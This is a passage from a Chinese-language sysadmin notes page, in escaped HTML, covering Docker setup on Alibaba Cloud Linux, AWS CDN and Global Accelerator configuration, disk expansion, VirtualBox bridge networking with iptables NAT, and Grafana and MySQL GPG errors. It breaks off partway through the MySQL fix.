 &lt;a href="#gnome-shell-%e7%bb%88%e7%ab%af%e8%ae%be%e7%bd%ae-title" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; export PROMPT_COMMAND=&amp;#39;echo -ne &amp;#34;\033]0; ${USER}@${HOSTNAME} \007&amp;#34;&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="阿里云安装-alinux-操作系统安装-docker"&gt;&lt;span&gt;阿里云安装 alinux 操作系统安装 docker&lt;/span&gt;
 &lt;a href="#%e9%98%bf%e9%87%8c%e4%ba%91%e5%ae%89%e8%a3%85-alinux-%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e5%ae%89%e8%a3%85-docker" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# aliyun的两个云镜像要安装docker都得安装一个兼容插件，否则在官方仓库中找不到对应的地址 
## Alibaba Cloud Linux 2
$&amp;gt; wget -O /etc/yum.repos.d/docker-ce.repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
$&amp;gt; sudo yum install yum-plugin-releasever-adapter --disablerepo=* --enablerepo=plus # 兼容插件

## Alibaba Cloud Linux 3
$&amp;gt; dnf config-manager --add-repo=https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
$&amp;gt; sudo dnf -y install dnf-plugin-releasever-adapter --repo alinux3-plus # 兼容插件&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="亚马逊cdn-添加-elb-作为后端源指定多备用域名无效有其他衍生问题-待继续测试"&gt;&lt;span&gt;亚马逊cdn 添加 elb 作为后端源，指定多备用域名无效(有其他衍生问题, 待继续测试)&lt;/span&gt;
 &lt;a href="#%e4%ba%9a%e9%a9%ac%e9%80%8acdn-%e6%b7%bb%e5%8a%a0-elb-%e4%bd%9c%e4%b8%ba%e5%90%8e%e7%ab%af%e6%ba%90%e6%8c%87%e5%ae%9a%e5%a4%9a%e5%a4%87%e7%94%a8%e5%9f%9f%e5%90%8d%e6%97%a0%e6%95%88%e6%9c%89%e5%85%b6%e4%bb%96%e8%a1%8d%e7%94%9f%e9%97%ae%e9%a2%98-%e5%be%85%e7%bb%a7%e7%bb%ad%e6%b5%8b%e8%af%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;问题体现: 亚马逊添加&lt;code&gt;cdn&lt;/code&gt;分配后，指向源站为&lt;code&gt;elb&lt;/code&gt;，此时&lt;code&gt;cdn&lt;/code&gt;配置多个备用域名，正常解析后，无论访问的是哪个备用域名，他们请求的最终站点始终是一个。&lt;/li&gt;
&lt;li&gt;问题分析:
&lt;ul&gt;
&lt;li&gt;怀疑是&lt;code&gt;sni&lt;/code&gt;的问题，&lt;code&gt;elb&lt;/code&gt;和&lt;code&gt;cdn&lt;/code&gt;这边所使用的证书都是通配符证书, 而在请求过程中，携带的&lt;code&gt;sni&lt;/code&gt;只有主域名，而上述问题中请求到的最终站点，恰好又是&lt;code&gt;nginx&lt;/code&gt;中配置的第一个。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;解决方案:
&lt;ul&gt;
&lt;li&gt;为每一个&lt;code&gt;cdn&lt;/code&gt;备用域名添加一个独立的&lt;code&gt;cdn&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="亚马逊调整-ebs-卷大小后扩展文件系统磁盘扩容"&gt;&lt;span&gt;亚马逊调整 EBS 卷大小后扩展文件系统(磁盘扩容)&lt;/span&gt;
 &lt;a href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e8%b0%83%e6%95%b4-ebs-%e5%8d%b7%e5%a4%a7%e5%b0%8f%e5%90%8e%e6%89%a9%e5%b1%95%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f%e7%a3%81%e7%9b%98%e6%89%a9%e5%ae%b9" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;### https://docs.aws.amazon.com/zh_cn/ebs/latest/userguide/recognize-expanded-volume-linux.html

## 1. 检查卷是否有分区
$&amp;gt; sudo lsblk

## 2. 扩展分区
# $&amp;gt; sudo growpart 需要扩展的盘 1
$&amp;gt; sudo growpart /dev/nvme0n1 1

## 3. 扩展文件系统
# xfs
$&amp;gt; sudo xfs_growfs -d / 
# ext4
# $&amp;gt; sudo resize2fs &amp;lt;挂载分区名&amp;gt;
$&amp;gt; sudo resize2fs /dev/nvme0n1p1&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="亚马逊加速器配置"&gt;&lt;span&gt;亚马逊加速器配置&lt;/span&gt;
 &lt;a href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e5%8a%a0%e9%80%9f%e5%99%a8%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://docs.aws.amazon.com/zh_cn/global-accelerator/latest/dg/what-is-global-accelerator.html" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://docs.aws.amazon.com/zh_cn/global-accelerator/latest/dg/what-is-global-accelerator.html&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;AWS Global Accelerator&lt;/code&gt;可以提高全球受众使用的 &lt;code&gt;Internet&lt;/code&gt; 应用程序的可用性。使用标准加速器，全球加速器将 &lt;code&gt;AWS&lt;/code&gt; 全球网络的流量引导到离客户端最近的区域中的终端节点。 本节主要说明&lt;code&gt;标准加速&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;案例: 我的服务器位于新加坡，在欧洲等其他地区访问新加坡服务器上站点很慢，正常来说，针对于站点加速应该优先使用&lt;code&gt;cdn&lt;/code&gt;，但是我们的站点主要是提供&lt;code&gt;api&lt;/code&gt;请求等动态的服务, 很少涉及静态资源缓存。所有选择&lt;code&gt;AWS Global Accelerator&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;创建步骤(登陆&lt;code&gt;aws&lt;/code&gt;后，选择 &lt;code&gt;Global Accelerator&lt;/code&gt;服务， 点击&lt;code&gt;创建加速器&lt;/code&gt;):
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;输入名称&lt;/code&gt;： 输入&lt;code&gt;加速器名称&lt;/code&gt;, &lt;code&gt;加速器类型&lt;/code&gt;选择标准, 其他根据需求修改， 点击&lt;code&gt;下一步&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;侦听器&lt;/code&gt;：录入&lt;code&gt;端口&lt;/code&gt;、&lt;code&gt;协议&lt;/code&gt;、&lt;code&gt;客户端亲和性&lt;/code&gt; ，其中&lt;code&gt;端口&lt;/code&gt;为后端对应的端口(比如我是加速后端&lt;code&gt;80&lt;/code&gt;，这儿填写的就是&lt;code&gt;80&lt;/code&gt;，建议一个端口一个监听器)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;添加端点组&lt;/code&gt;： 修改&lt;code&gt;端点组1&lt;/code&gt;中的&lt;code&gt;区域&lt;/code&gt;(&lt;code&gt;区域&lt;/code&gt;对应的就是你需要加速的目标区域，比如我的是新加坡,这儿选择的就是新加坡&lt;code&gt;ap-southeast-1&lt;/code&gt;)，其他配置默认即可。点击&lt;code&gt;下一步&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;添加端点&lt;/code&gt;： 点击&lt;code&gt;添加端点&lt;/code&gt;, 修改&lt;code&gt;端点类型&lt;/code&gt;，你后端是什么就选择什么，&lt;code&gt;端点类型&lt;/code&gt;选择过后，&lt;code&gt;端点&lt;/code&gt;会自动加载已有的资源信息，其他默认。 点击&lt;code&gt;创建加速器&lt;/code&gt; 即完成创建。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;加速器&lt;/code&gt;创建完成后会提供一个&lt;code&gt;dns&lt;/code&gt;地址，将需要加速的域名直接解析上去即可。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;AWS Global Accelerator&lt;/code&gt;的功能和&lt;code&gt;cdn&lt;/code&gt;类似，但效果比&lt;code&gt;cdn&lt;/code&gt;好, 费用肯定要更高一些了。他还可以实现端口转发等其他的功能，可以自行参悟。&lt;/p&gt;
&lt;h2 class="heading-element" id="阿里云磁盘分区扩容"&gt;&lt;span&gt;阿里云磁盘分区扩容&lt;/span&gt;
 &lt;a href="#%e9%98%bf%e9%87%8c%e4%ba%91%e7%a3%81%e7%9b%98%e5%88%86%e5%8c%ba%e6%89%a9%e5%ae%b9" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://help.aliyun.com/zh/ecs/user-guide/step-2-resize-partitions-and-file-systems/?spm=a2c4g.11186623.0.0.5a193a8aP9JIh1" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://help.aliyun.com/zh/ecs/user-guide/step-2-resize-partitions-and-file-systems/?spm=a2c4g.11186623.0.0.5a193a8aP9JIh1&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;# 确认分区信息
$&amp;gt; sudo fdisk -lu

# 扩容分区
## 命令参数中的 /dev/vdb 和 1 之间需要空格分隔，1是分区编号, 是需要扩容的盘。
$&amp;gt; type growpart || sudo yum install -y cloud-utils-growpart
$&amp;gt; sudo yum update cloud-utils-growpart
$&amp;gt; type sgdisk || sudo yum install -y gdisk
$&amp;gt; sudo LC_ALL=en_US.UTF-8 growpart /dev/vdb 1 

# 扩容盘
## xfs 扩容 , /mnt 是挂载的目录 
$&amp;gt; type xfs_growfs || sudo yum install -y xfsprogs
$&amp;gt; sudo xfs_growfs /mnt

## ext 扩容
$&amp;gt; sudo resize2fs /dev/vdb1

########################################## 
## 裸盘扩容 
$&amp;gt; sudo resize2fs /dev/vdc &lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="网络故障记录"&gt;&lt;span&gt;网络故障记录&lt;/span&gt;
 &lt;a href="#%e7%bd%91%e7%bb%9c%e6%95%85%e9%9a%9c%e8%ae%b0%e5%bd%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;症状&lt;/code&gt;：局域网机器网络故障，时好时坏。故障时候无法&lt;code&gt;ping&lt;/code&gt;通网关(无法获取响应)，但可以&lt;code&gt;ping&lt;/code&gt;通同网段的其他主机，也可以与其他主机正常通信。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;原因&lt;/code&gt;：当前主机是通过手动配置&lt;code&gt;ip&lt;/code&gt;，而局域网&lt;code&gt;ip&lt;/code&gt;是路由自动分配的，有其他同事在连接时候占用了当前主机配置的&lt;code&gt;ip&lt;/code&gt;，从而&lt;code&gt;ip&lt;/code&gt;重复导致了上诉问题。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="linux-桌面环境下绑定指定唤起协议"&gt;&lt;span&gt;linux 桌面环境下，绑定指定唤起协议&lt;/span&gt;
 &lt;a href="#linux-%e6%a1%8c%e9%9d%a2%e7%8e%af%e5%a2%83%e4%b8%8b%e7%bb%91%e5%ae%9a%e6%8c%87%e5%ae%9a%e5%94%a4%e8%b5%b7%e5%8d%8f%e8%ae%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;例如 &lt;code&gt;mailto://&lt;/code&gt; 可以唤起指定的邮件应用,下面以一个&lt;code&gt;appimage&lt;/code&gt;程序为例，假设其唤醒协议是&lt;code&gt;folo://&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;# 创建一个desktop文件(~/.local/share/applications)
$&amp;gt; vim ~/.local/share/applications/appimagekit-example.desktop 
[Desktop Entry]
Name=Example
Comment=Example desktop

Exec=/opt/tools/example.appImage %U

Icon=Icon=/usr/share/icons/logo.svg

Terminal=false
Type=Application
Categories=Application;Development;
StartupNotify=true
# 主要是这个 MimeType, folo 即为相关协议(浏览器请求 folo:// 打开此程序)
MimeType=x-scheme-handler/folo;

# 绑定协议到指定的应用上
$&amp;gt; xdg-mime default appimagekit-example.desktop x-scheme-handler/folo

# 查询已绑定的信息 
$&amp;gt; xdg-mime query default x-scheme-handler/folo&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="解决-virtualbox-仅主机模式无法定制ip网段的问题仅主机模式无法连接公网的问题"&gt;&lt;span&gt;解决 Virtualbox 仅主机模式无法定制IP网段的问题(仅主机模式无法连接公网的问题)&lt;/span&gt;
 &lt;a href="#%e8%a7%a3%e5%86%b3-virtualbox-%e4%bb%85%e4%b8%bb%e6%9c%ba%e6%a8%a1%e5%bc%8f%e6%97%a0%e6%b3%95%e5%ae%9a%e5%88%b6ip%e7%bd%91%e6%ae%b5%e7%9a%84%e9%97%ae%e9%a2%98%e4%bb%85%e4%b8%bb%e6%9c%ba%e6%a8%a1%e5%bc%8f%e6%97%a0%e6%b3%95%e8%bf%9e%e6%8e%a5%e5%85%ac%e7%bd%91%e7%9a%84%e9%97%ae%e9%a2%98" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;此方案只适合&lt;code&gt;linux&lt;/code&gt;桌面系统，&lt;code&gt;windows&lt;/code&gt;理论可参考设定&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 创建一个虚拟网桥
$&amp;gt; sudo brctl addbr br-vbox0
# sudo ip link add name br-vbox0 type bridge

# 启用网桥和物理网卡
$&amp;gt; sudo ip link set dev br-vbox0 up

# 为网桥设置IP地址(这个ip相当于这个网段的路由)
$&amp;gt; sudo ip addr add 172.31.10.1/24 dev br-vbox0

# Virtualbox 创建虚拟机时候，网卡的连接方式改为桥连网卡, 然后选择创建的网桥 br-vbox0 即可(没有dhcp，需要自己手动配置服务器上的网卡信息) 

## 以上步骤完成，那么配置的虚拟机网络即为仅主机模式，且可以自定义网段 

### 构建一个systemd管理脚本
$&amp;gt; sudo vi /etc/systemd/system/create-bridge@.service
[Unit]
Description=Create bridge br-vbox%i
After=network.target

[Service]
Type=oneshot
ExecStart=/usr/sbin/brctl addbr br-vbox%i
ExecStart=/usr/sbin/ip link set dev br-vbox%i up
ExecStart=/usr/sbin/ip addr add 172.31.1%i.1/24 dev br-vbox%i
ExecStop=/usr/sbin/ip link set dev br-vbox%i down
ExecStop=/usr/sbin/brctl delbr br-vbox%i
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target

$&amp;gt; sudo systemctl daemon-reload 
# $&amp;gt; sudo systemctl &amp;lt;start|stop|status&amp;gt; create-bridge@0.service
### 

## 开始设置该模式下的主机可连接公网
## 需要iptables支持，创建步骤和 https://blog.0x5c0f.cc/2019/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/#linux-%E4%B8%8B%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E4%B8%8A%E5%85%AC%E7%BD%91 一致 

# 物理机执行
# 允许NAT功能和网络包的转发(wlp0s20f3 为可以连接公网的网卡)
$&amp;gt; sudo iptables -t nat -A POSTROUTING -o wlp0s20f3 -j MASQUERADE
# 允许从内网到公网的数据包转发
$&amp;gt; sudo iptables -A FORWARD -i br-vbox0 -o wlp0s20f3 -j ACCEPT
# 允许已经建立连接的流量转发
$&amp;gt; sudo iptables -A FORWARD -i wlp0s20f3 -o br-vbox0 -m state --state RELATED,ESTABLISHED -j ACCEPT&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="grafana-查询错误-a-got-error-input-data-must-be-a-wide-series-but-got-type-long-input-refid"&gt;&lt;span&gt;grafana 查询错误 &lt;code&gt;[A] got error: input data must be a wide series but got type long (input refid)&lt;/code&gt;&lt;/span&gt;
 &lt;a href="#grafana-%e6%9f%a5%e8%af%a2%e9%94%99%e8%af%af-a-got-error-input-data-must-be-a-wide-series-but-got-type-long-input-refid" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;这个问题是在配置&lt;code&gt;grafana&lt;/code&gt;警报规则时出现的，实际上这儿添加的是表达式，而不是查询标签，统计出来的结果只能是数字(看看&lt;code&gt;prometheus&lt;/code&gt;的&lt;code&gt;graph&lt;/code&gt;面板 )&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="通过yum安装的mysql进行升级的时候报错-xxx-fileetcpkirpm-gpgrpm-gpg-key-mysql"&gt;&lt;span&gt;通过yum安装的mysql进行升级的时候报错 &lt;code&gt;xxx file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql&lt;/code&gt;&lt;/span&gt;
 &lt;a href="#%e9%80%9a%e8%bf%87yum%e5%ae%89%e8%a3%85%e7%9a%84mysql%e8%bf%9b%e8%a1%8c%e5%8d%87%e7%ba%a7%e7%9a%84%e6%97%b6%e5%80%99%e6%8a%a5%e9%94%99-xxx-fileetcpkirpm-gpgrpm-gpg-key-mysql" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;这个错误多数出现在yum安装 &lt;code&gt;mysql5.6&lt;/code&gt;、&lt;code&gt;5.7&lt;/code&gt; 时&lt;br&gt;
问题:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;warning: /var/cache/yum/x86_64/7/mysql57-community/packages/mysql-community-libs-5.7.44-1.el7.x86_64.rpm: Header V4 RSA/SHA256 Signature, key ID 3a79bd29: NOKEY
Retrieving key from file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql

The GPG keys listed for the &amp;#34;MySQL 5.7 Community Server&amp;#34; repository are already installed but they are not correct for this package.
Check that the correct key URLs are configured for this repository.

Failing package is: mysql-community-libs-5.7.44-1.el7.x86_64
GPG Keys are configured as: file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解决:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 不行就删掉原来的GPG 密钥，在重新导入
